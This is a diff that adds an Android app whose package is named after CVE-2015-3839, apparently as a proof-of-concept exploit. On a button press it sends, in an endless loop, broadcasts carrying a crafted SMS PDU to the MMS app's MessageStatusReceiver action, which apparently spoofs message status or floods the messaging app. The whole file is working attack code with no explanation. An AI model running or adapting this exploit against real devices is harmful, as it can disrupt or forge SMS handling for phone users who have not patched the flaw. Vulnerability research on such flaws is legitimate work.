@@ -1,0 +1,67 @@
+package com.cve_2015_3839;
+
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.ServiceConnection;
+import android.os.IBinder;
+import android.support.v7.app.AppCompatActivity;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+import android.util.Log;
+import android.view.View;
+import android.widget.Button;
+
+import java.lang.reflect.Method;
+
+public class MainActivity extends AppCompatActivity {
+
+
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+//        SmsManager sm = SmsManager.getDefault();
+//        Class<? extends SmsManager> c = sm.getClass();
+//        Method[] ms = c.getDeclaredMethods();
+//        for (int i = 0; i < ms.length; i++)
+//            Log.e("ListMethods",ms[i].toString());
+        Button bt = (Button) findViewById(R.id.button);
+        bt.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                for(;;)
+                {
+                    String pdubyte = "0091683108200505F0";
+                    Intent intent = new Intent();
+                    intent.putExtra("pdu", hexStringToBytes(pdubyte));
+                    intent.putExtra("format", "3gpp");
+                    intent.setAction("com.android.mms.transaction.MessageStatusReceiver.MESSAGE_STATUS_RECEIVED");
+                    MainActivity.this.sendBroadcast(intent);
+                }
+            }
+        });
+
+    }
+
+
+    public static byte[] hexStringToBytes(String hexString) {
+        if (hexString == null || hexString.equals("")) {
+            return null;
+        }
+        hexString = hexString.toUpperCase();
+        int length = hexString.length() / 2;
+        char[] hexChars = hexString.toCharArray();
+        byte[] d = new byte[length];
+        for (int i = 0; i < length; i++) {
+            int pos = i * 2;
+            d[i] = (byte) (charToByte(hexChars[pos]) << 4 | charToByte(hexChars[pos + 1]));
+        }
+        return d;
+    }
+
+    public static byte charToByte(char c) {
+        return (byte) "0123456789ABCDEF".indexOf(c);
+    }
+}
